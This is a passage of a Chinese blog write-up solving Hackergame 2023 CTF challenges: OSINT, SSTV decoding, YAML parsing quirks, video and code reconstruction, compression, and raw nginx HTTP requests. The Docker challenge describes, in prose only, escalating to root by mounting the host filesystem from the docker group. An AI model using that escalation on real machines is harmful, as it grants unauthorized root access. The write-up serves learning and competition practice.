50%;"></p><p>5.看第二张图，搜索STATPHYS28。</p><p>找时间表<a href="https://statphys28.org/programtt.html">STATPHYS28</a>，发现2023-8-10有晚宴。</p><p>再找晚宴通知<a href="https://statphys28.org/banquet.html">STATPHYS28</a>，找到集合地点Yasuda Auditorium：</p><p><img src="/Hackergame2023_WP/image-20231101170022023.png" alt="image-20231101170022023" style="zoom:50%;"></p><p>百度搜索“东京大学 礼堂”即可找到中文译名“安田讲堂”。</p><p>6.把活动名称复制到Google搜出海报：</p><p><img src="/Hackergame2023_WP/images.jpeg.jpg" class title="images.jpeg"></p><p>“马里奥世界”指任天堂涩谷专卖店，不难搜到涩谷有块3D秋田犬广告牌：</p><p><img src="/Hackergame2023_WP/image-20231101170710244.png" alt="image-20231101170710244" style="zoom: 33%;"></p><p><strong>答案及第三个flag：</strong></p><p><img src="/Hackergame2023_WP/image-20231101165755663.png" alt="image-20231101165755663" style="zoom: 50%;"></p><h3 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h3><h4 id="题目描述：-7"><a href="#题目描述：-7" class="headerlink" title="题目描述："></a>题目描述：</h4><p>「生而为人，应该能够换尿布、策划入侵、杀猪、开船、造房子、写十四行诗、算账、建墙、正骨、抚慰临终之人、接受命令、下达命令、合作、独行、解决方程式、分析新问题、清理马粪、编程、烹饪美食、高效战斗、英勇牺牲。专业分工是给昆虫准备的。」—罗伯特·海莱恩（Robert Heinlein）</p><p>你觉得还是当昆虫轻松一些。</p><p>这时，你看到一只昆虫落在你面前，发出奇怪的叫声。你把这段声音录制了下来：这听起来像是一种<strong>通过无线信道传输图片的方式</strong>，如果精通此道，或许就可以接收来自国际空间站（ISS）的图片了。</p><h4 id="题解：-5"><a href="#题解：-5" class="headerlink" title="题解："></a>题解：</h4><p>题目给的附件是wav音频，并且**是ISS传输图片的方式?**这不就是SSTV(Slow Scan Television，慢扫电视)吗。</p><p>需要将音频播放到SSTV软件进行解析，如果介意因为外放被室友辱骂或担心被大声骂街、大力金刚指敲键盘的室友发出的噪音干扰信号，可以使用虚拟声卡。</p><p>打开SSTV软件，打开音频，坐和放宽，等待flag出现吧。</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png" alt="屏幕截图(124)" style="zoom:33%;"></p><h3 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h3><h4 id="题目描述：-8"><a href="#题目描述：-8" class="headerlink" title="题目描述："></a>题目描述：</h4><p>X 是实验室机器的管理员，为了在保证安全的同时让同学们都用上 docker，他把同学的账号加入了 docker 用户组，这样就不需要给同学 sudo 权限了！</p><p>但果真如此吗？</p><h4 id="题解：-6"><a href="#题解：-6" class="headerlink" title="题解："></a>题解：</h4><p>这个Docker能提权吗？既然加组了，挂载根目录试一试。</p><p>权限变成了root，然后就轻松地获得了flag：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(145).png" alt="屏幕截图(145)" style="zoom: 33%;"></p><h3 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h3><h4 id="题目描述：-9"><a href="#题目描述：-9" class="headerlink" title="题目描述："></a>题目描述：</h4><p>你知道吗？Hackergame 出题时，每道题都需要出题人用 YAML 格式写下题目的关键信息。然而，每年总有一些出题人在编写 YAML 文件时被复杂的语法规则弄得头疼不已。</p><p>这天小 Z 又找到小 W 说：「我昨天写 YAML 时，又花了半天研究 YAML 的规范，YAML 好难啊！」</p><p>小 W 惊讶道：「怎么会有人不会写 YAML 呢？只要你会写 JSON 就会写 YAML 呀，因为任何合法的 JSON 本身就是合法的 YAML。」</p><p>小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」</p><p>小 Z 笑了：「别提 YAML 1.2 了，它遇到合法的 JSON 都有可能报错。」</p><h4 id="题解：-7"><a href="#题解：-7" class="headerlink" title="题解："></a>题解：</h4><p>在YAML1.1中，1e2必须写作1.0e+2，因此1e2会被视作字符串，由此获得第一个flag：</p><p><img src="/Hackergame2023_WP/image-20231030161555689.png" alt="image-20231030161555689"></p><p>第二个flag参考<a href="https://www.perlmonks.org/?node_id=1108609">duplicate keys in YAML (perlmonks.org)</a>的思路——JSON允许有重名的键，而YAML1.2不允许：</p><p><img src="/Hackergame2023_WP/image-20231101070721367.png" class title="image-20231101070721367"></p><h4 id="花絮："><a href="#花絮：" class="headerlink" title="花絮："></a>花絮：</h4><p>我在开始做这道题的时候试图学习YAML的语法规则，结果在给这篇题解添加标签时，Hexo因标签格式有误而报错了。</p><p>YAML真是害人不浅呐(</p><h3 id="🪐-高频率星球"><a href="#🪐-高频率星球" class="headerlink" title="🪐 高频率星球"></a>🪐 高频率星球</h3><h4 id="题目描述：-10"><a href="#题目描述：-10" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>包含 AI 辅助创作</p></blockquote><p><img src="/Hackergame2023_WP/cover-16987945328411.jpeg" alt="cover.jpeg" style="zoom:25%;"></p><p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p><p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的高频率星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p><p>高频率星人的视觉输入频率极高，可以一目千行、过目不忘，他们的交流对地球人来说过于超前了。flag 被藏在了这段代码中，但是现在只有高频率星人在终端浏览代码的时候，使用 <a href="https://asciinema.org/">asciinema</a> 录制的文件了，你能从中还原出代码吗？</p><h4 id="题解：-8"><a href="#题解：-8" class="headerlink" title="题解："></a>题解：</h4><p>没想到特别好的解法，不过手动处理代码中被混淆的部分肯定是可以的——打开asciinema_restore.rec，会发现flag.js文件内容是完整的，只是多了时间戳等一系列标记。</p><p>手动去除<del>不太费事</del>稍微有点费事，大概需要1~2小时，还原出的代码约26000行。可以用Notepad++将文中的\r\n字符替换成真正的回车换行以方便阅读，处理完成之后再用VSCode等工具检查括号即可。代码可读性堪比IOCCC的参赛作品，还是不要相信目力检查的可靠性：</p><p><img src="/Hackergame2023_WP/image-20231101072125787.png" alt="image-20231101072125787" style="zoom: 50%;"></p><p>获得flag：</p><p><img src="/Hackergame2023_WP/image-20231101072810735.png" alt="image-20231101072810735" style="zoom: 50%;"></p><h3 id="🪐-流式星球"><a href="#🪐-流式星球" class="headerlink" title="🪐 流式星球"></a>🪐 流式星球</h3><h4 id="题目描述：-11"><a href="#题目描述：-11" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>包含 AI 辅助创作</p></blockquote><p><img src="/Hackergame2023_WP/cover-16988126457214.jpeg" alt="cover.jpeg" style="zoom: 25%;"></p><p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p><p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的流式星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p><p>流式星人用流式数据交流，比如对于视频来说，他们不需要同时纵览整个画面，而是直接使用像素流。为了方便理解，你把这个过程写成了一个 Python 脚本（见附件），flag 就藏在这个视频（见附件）中。尽管最后丢掉了一部分数据，你能把 flag 还原出来吗？</p><h4 id="题解：-9"><a href="#题解：-9" class="headerlink" title="题解："></a>题解：</h4><p>先研究一下视频是怎么变成像素流的。对每一帧都有如下操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer = buffer.reshape((frame_count * frame_height * frame_width, <span class="hljs-number">3</span>))<br>buffer = buffer.ravel()<br></code></pre></td></tr></table></figure><p>这组操作将每个像素点变成三维RGB向量，然后展平。</p><p>所以对每一帧做以下操作，就可以尝试用像素流还原视频了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">restore_frame</span>(<span class="hljs-params">pixel_stream,num,width,height</span>):<br>    start=num*width*height*<span class="hljs-number">3</span><br>    end=start+width*height*<span class="hljs-number">3</span><br>    pixels=pixel_stream[start:end]<br>    frame=np.reshape(pixels,(height,width,<span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">return</span> frame<br></code></pre></td></tr></table></figure><p>可以用以下操作还原视频的某一帧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;video.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        pixel_stream=np.fromfile(f,dtype=np.uint8)<br>        <span class="hljs-comment">#分辨率854x480可以正确解码</span><br>        width=<span class="hljs-number">854</span><br>        height=<span class="hljs-number">480</span><br>        <span class="hljs-comment">#选择第100帧</span><br>        num=<span class="hljs-number">100</span><br>        frame=restore_frame(pixel_stream,num,width,height)<br>        <span class="hljs-comment">#显示这一帧</span><br>        cv2.imshow(<span class="hljs-string">&quot;Video&quot;</span>,frame)<br>        cv2.waitKey()<br>        cv2.destroyAllWindows()<br></code></pre></td></tr></table></figure><p>这一帧里恰好有flag：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-01%20121958.png" alt="屏幕截图 2023-11-01 121958" style="zoom: 33%;"></p><h3 id="🪐低带宽星球-部分完成"><a href="#🪐低带宽星球-部分完成" class="headerlink" title="🪐低带宽星球(部分完成)"></a>🪐低带宽星球(部分完成)</h3><h4 id="题目描述：-12"><a href="#题目描述：-12" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>包含 AI 辅助创作</p></blockquote><p><img src="/Hackergame2023_WP/cover-16985516279892.jpeg" alt="cover.jpeg" style="zoom:25%;"></p><p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p><p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的低带宽星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p><p>低带宽星人的通信速度很低，只能以 1 字节 &#x2F; 天的速度接受信息，所以在这个星球上，你需要将一张图片用很少的字节数传输给低带宽星人，然后获得 flag。具体来说你需要将一张图片无损压缩（每个像素的颜色都一致）：</p><ul><li>压缩至 2KiB (2048 字节) 及以下，获得 flag1；</li><li>压缩至 50 字节及以下，获得 flag2。</li></ul><h4 id="题解（部分）：-2"><a href="#题解（部分）：-2" class="headerlink" title="题解（部分）："></a>题解（部分）：</h4><p>获得flag1只要求压缩到2KiB及以下，鉴于这张图片有大块纯色，直接用一般的压缩工具就能解决，比如这个<a href="https://tinypng.com/">TinyPNG – Compress WebP, PNG and JPEG images intelligently</a>。上传图片得到flag1：</p><p><img src="/Hackergame2023_WP/image-20231029115700278.png" alt="image-20231029115700278" style="zoom:80%;"></p><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="惜字如金-2-0"><a href="#惜字如金-2-0" class="headerlink" title="惜字如金 2.0"></a>惜字如金 2.0</h3><h4 id="题目描述：-13"><a href="#题目描述：-13" class="headerlink" title="题目描述："></a>题目描述：</h4><p>惜字如金一向是程序开发的优良传统。无论是「<a href="https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat">creat</a>」还是「<a href="https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer">referer</a>」，都无不闪耀着程序员「节约每句话中的每一个字母」的优秀品质。上一届信息安全大赛组委会在去年推出「惜字如金化」（XZRJification）标准规范后，受到了广大程序开发人员的好评。现将该标准辑录如下。</p><p><strong>惜字如金化标准</strong></p><p>惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「<code>AEIOUaeiou</code>」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：</p><ul><li>第一原则（又称 creat 原则）：如单词最后一个字母为「<code>e</code>」或「<code>E</code>」，且该字母的上一个字母为辅音字母，则该字母予以删除。</li><li>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。</li></ul><p>容易证明惜字如金化操作是幂等的：惜字如金化多次和惜字如金化一次的结果相同。</p><p><strong>你的任务</strong></p><p>附件包括了一个用于打印本题目 flag 的程序，且已经经过惜字如金化处理。你需要做的就是得到程序的执行结果。</p><p><strong>附注</strong></p><blockquote><p>本文已经过惜字如金化处理。解答本题不需要任何往届比赛的相关知识。</p><hr><p>XIZIRUJIN has always been a good tradition of programing. Whether it is “<a href="https://stackoverflow.com/questions/8390979/why-create-system-call-is-called-creat">creat</a>“ or “<a href="https://stackoverflow.com/questions/8226075/why-http-referer-is-single-r-not-http-referrer">referer</a>“, they al shin with th great virtu of a programer which saves every leter in every sentens. Th Hackergam 2022 Comitee launched th “XZRJification” standard last year, which has been highly aclaimed by a wid rang of programers. Her w past th standard as folows.</p><p><strong>XZRJification Standard</strong></p><p>XZRJification refers to th proces of deleting som characters in a text which forms another text. Th standard aims at al th continuous sequences of 52 Latin leters named as “word”s in a text. Th 42 leters in a word except “<code>AEIOUaeiou</code>“ ar caled “consonant”s. Th XZRJification proces operates on each word in th text acording to th folowing two principles:</p><ul><li>Th first principl (also known as creat principl): If th last leter of th word is “<code>e</code>“ or “<code>E</code>“, and th previous leter of this leter is a consonant, th leter wil b deleted.</li><li>Th second principl (also known as referer principl): If ther is a substring of th sam consonant (ignoring cas) in a word, only th first leter of th substring wil b reserved.</li></ul><p>It is easy to prov that XZRJification is idempotent: th result of procesing XZRJification multipl times is exactly th sam as that of only onc.</p><p><strong>Your Task</strong></p><p>A program for printing th flag of this chaleng has been procesed through XZRJification and packed into th atachment. Al you need to do is to retriev th program output.</p><p><strong>Notes</strong></p><p>This articl has been procesed through XZRJification. Any knowledg related to previous competitions is not required to get th answer to this chaleng.</p></blockquote><h4 id="题解：-10"><a href="#题解：-10" class="headerlink" title="题解："></a>题解：</h4><p>先把几个check改成方便调试的样子，比如这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> left != right: <br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>然后还原<code>name</code>，尝试打印flag，发现字典长度至少需要达到119（代码包含字典长度为115），需要补充≥4个字符。</p><p>尝试打印序列<code>[53,41,85,109,75,28]</code>，期望得到<code>flag&#123;&#125;</code>，实际得到 <code>oso!ik</code>，偏移量分别为3,1,3(或4),5,4,1。显然索引增加之后偏移量不可能减少，可以做出以下推断：</p><p>在索引<code>小于28</code>，<code>41到53</code>，<code>53到75</code>，<code>85到109</code>的部分各有1,2,1,1个字符被惜字如金化处理。</p><p>然后试着把flag打印出来强行拼凑单词。</p><p>重复上述步骤，改变打印的序列（注意下表不要越界）继续比较偏移量变化，查找被惜字如金化处理的字符位置。</p><p>下面是一个得到flag的可行字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">cod_dict = []<br>cod_dict += [<span class="hljs-string">&#x27;nymeh1niwemflcir&#125;echaett&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;a3g7&#125;kidgojernoetlsupe?h&#x27;</span>] <br>cod_dict += [<span class="hljs-string">&#x27;ullw!f5soadrhwnrsnsttnoeq&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span>]    <br>cod_dict += [<span class="hljs-string">&#x27;tty9kxborszstguyd?!blm-p&#x27;</span>]<br></code></pre></td></tr></table></figure><p>为了不影响获取flag，可以把几个check注释掉，拿到flag：</p><p><img src="/Hackergame2023_WP/image-20231029111159529.png" alt="image-20231029111159529"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Hackergame启动"><a href="#Hackergame启动" class="headerlink" title="Hackergame启动"></a>Hackergame启动</h3><h4 id="题目描述：-14"><a href="#题目描述：-14" class="headerlink" title="题目描述："></a>题目描述：</h4><p>大声喊出 Hackergame 启动，开始今年的冒险！</p><h4 id="题解：-11"><a href="#题解：-11" class="headerlink" title="题解："></a>题解：</h4><p>要求相似度大于99.9%？这有点难，不过请求参数明文写着呢。</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(82).png" alt="屏幕截图(82)" style="zoom: 25%;"></p><p>拿到flag：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(88).png" alt="屏幕截图(88)" style="zoom:25%;"></p><h3 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h3><h4 id="题目描述：-15"><a href="#题目描述：-15" class="headerlink" title="题目描述："></a>题目描述：</h4><p>小 E 正在收看电视新闻。</p><p>「诶，你知道吗，『泰坦』号潜水艇失事了！」小 E 对旁边的小 C 说。</p><p>小 C 凑近电视机，看了一眼新闻里的画面。</p><p>「是我眼花了吗？我刚刚有一瞬间好像在残骸上看到了一个 flag？」小 C 惊讶地说。</p><p>「玩 CTF 玩的。」小 E 对此不以为然，「一定是你看错了。」</p><p>小 C 却十分相信自己没有看错。</p><h4 id="题解：-12"><a href="#题解：-12" class="headerlink" title="题解："></a>题解：</h4><p>打开题目页面，貌似没有可以操作的地方，遇事不决先检查元素试试看，翻到底下就发现了flag：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(105).png" alt="屏幕截图(105)" style="zoom:50%;"></p><h3 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h3><h4 id="题目描述：-16"><a href="#题目描述：-16" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>「HTTP 请求一瞬间就得到了响应，但是，HTTP 响应的 status line、header 和 body 都是确实存在的。如果将一个一个 HTTP 状态码收集起来，也许就能变成……变成……变成……」</p><p>「flag？」</p><p>「就能变成 flag！」</p></blockquote><hr><p>本题中，你可以向一个 nginx 服务器（对应的容器为**默认配置下的 <code>nginx:1.25.2-bookworm</code>**）发送 HTTP 请求。你需要获取到不同的 HTTP 响应状态码以获取 flag，其中：</p><ul><li>获取第一个 flag 需要收集 5 种状态码；</li><li>获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；</li><li>获取第三个 flag 需要收集 12 种状态码。</li></ul><p>关于无状态码的判断逻辑如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">crlf = buf.find(<span class="hljs-string">b&quot;\r\n&quot;</span>)<br><span class="hljs-keyword">if</span> buf.strip() != <span class="hljs-string">b&quot;&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> crlf == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No CRLF found&quot;</span>)<br>        status_line = buf[:crlf]<br>        http_version, status_code, reason_phrase = status_line.split(<span class="hljs-string">b&quot; &quot;</span>, <span class="hljs-number">2</span>)<br>        status_code = <span class="hljs-built_in">int</span>(status_code)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        buf += <span class="hljs-string">&quot;（无状态码）&quot;</span>.encode()<br>        status_code = <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><h4 id="题解：-13"><a href="#题解：-13" class="headerlink" title="题解："></a>题解：</h4><p>收集HTTP200  OK：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">1.1</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP400  Bad Request：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP404  Not Found：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET /flag HTTP/<span class="hljs-number">1.1</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP405 Not Allowed：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">POST / HTTP/<span class="hljs-number">1.1</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p> 收集HTTP505 HTTP Version not supported:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">2.0</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p><strong>第一个flag完成：</strong></p><p><img src="/Hackergame2023_WP/image-20231028211647959.png" alt="image-20231028211647959" style="zoom: 67%;"></p><p>收集HTTP304 Not Modified（If-None-Match填入之前的ETag）：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">1.1</span>\r\n<br>If-None-<span class="hljs-name">Match</span>:<span class="hljs-string">&quot;64dbafc8-267&quot;</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP412 Precondition Failed（If-Match填入与之前ETag不同的值）：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">1.1</span>\r\n<br>If-<span class="hljs-name">Match</span>:<span class="hljs-string">&quot;1145afc8-267&quot;</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP413 Request Entity Too Large：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">1.1</span>\r\n<br>Content-<span class="hljs-name">Length</span>:<span class="hljs-number">2147483647</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP206 Partial Content：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Range</span>: bytes=<span class="hljs-number">0</span>-<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP416 Requested Range Not Satisfiable：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Range</span>: bytes=<span class="hljs-number">1919810</span>-<span class="hljs-number">114514</span>\r\n<br><span class="hljs-attribute">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP414 Request-URI Too Large（<code>&lt;string&gt;</code>换成超长字符串，随便复制粘贴个几万字符即可）：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET /index.html?&lt;<span class="hljs-built_in">string</span>&gt; HTTP/<span class="hljs-number">1.1</span>\r\n<br><span class="hljs-name">Host</span>:example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>收集HTTP100 Continue：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">GET / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Expect:<span class="hljs-number">100</span>-<span class="hljs-keyword">continue</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n\r\n</span><br></code></pre></td></tr></table></figure><p><strong>第三个flag完成：</strong></p><p><img src="/Hackergame2023_WP/image-20231031003249535.png" alt="image-20231031003249535" style="zoom: 50%;"></p><p>接下来寻找第二个flag，符合规范的请求是这样的：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">1.1</span>\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>要让返回的响应没有状态码（<del>不合规范</del>实际上是HTTP0.9的活化石），那就需要在规范的请求（HTTP1.1）上做减法。资源名称、主机名称肯定是不能删除的，那么把协议版本字段删除呢？也就是下面这样：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / \r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br></code></pre></td></tr></table></figure><p>响应首行确实没有状态码：</p><p><img src="/Hackergame2023_WP/image-20231102120829052.png" alt="image-20231102120829052" style="zoom: 33%;"></p><p><strong>第二个flag完成：</strong></p><p><img src="/Hackergame2023_WP/image-20231102120901748.png" alt="image-20231102120901748" style="zoom: 50%;"></p><h3 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h3><h4 id="题目描述：-17"><a href="#题目描述：-17" class="headerlink" title="题目描述："></a>题目描述：</h4><p>每年比赛，组委会的一项重要工作就是时刻盯着群，并且撤回其中有 flag 的消息。今年因为人手紧张，组委会的某名同学将这项工作外包给了你，你需要连续审查 1000 条消息，准确无误地撤回其中所有含 flag 的消息，并且不撤回任何不含 flag 的消息。</p><p>本题中，你需要撤回的 “flag” 的格式为 <strong><code>hack[...]</code><strong>，其中</strong>方括号</strong>内均为小写英文字母，点击消息即可撤回。你需要在 3 秒内撤回消息，否则撤回操作将失败。在全部消息显示完成后等待几秒，如果你撤回的消息完全正确（撤回了全部需要撤回的消息，并且未将不需要撤回的消息撤回），就能获得本题<strong>真正的 flag</strong>。</p><h4 id="题解：-14"><a href="#题解：-14" class="headerlink" title="题解："></a>题解：</h4><p>作者使用的浏览器是Microsoft Edge(Chromium-based)，写个Selenium脚本试试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">from</span> selenium.webdriver.edge.options <span class="hljs-keyword">import</span> Options<br><span class="hljs-keyword">from</span> selenium.webdriver.common.keys <span 